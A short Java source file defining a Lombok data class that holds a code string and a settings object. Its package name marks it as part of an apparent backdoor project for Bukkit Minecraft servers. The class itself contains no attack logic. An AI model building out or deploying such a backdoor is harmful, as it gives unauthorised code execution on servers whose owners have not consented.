package com.balugaq.bukkitbackdoor.code;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import javax.annotation.ParametersAreNonnullByDefault;

@Data
@ParametersAreNonnullByDefault
@NoArgsConstructor
@AllArgsConstructor
public class Code {
    public String code = ";";
    public Settings settings = new Settings();
}
